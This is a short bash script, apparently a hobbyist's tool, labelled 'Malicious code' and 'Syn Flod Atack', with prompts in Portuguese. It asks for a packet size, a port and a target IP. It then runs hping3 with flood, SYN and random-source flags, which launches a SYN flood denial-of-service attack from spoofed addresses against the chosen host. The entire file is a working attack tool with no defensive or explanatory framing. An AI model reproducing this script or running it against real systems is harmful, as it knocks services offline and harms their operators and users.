#!/bin/bash
#==========Malicious code============
#==========version: 1.0  ============
#===========Autor: loktwo ============
clear

echo "==========Syn Flod Atack==========="
echo "==================================="
echo -n "========= Tamanho do Pacote: "
read PACOTE
echo -n "========= Porta: "
read PORTA
echo -n "========= IP Alvo: "
read IP
 
hping3 -c $PACOTE -d 120 -S -w 64 -p $PORTA --flood --rand-source $IP 
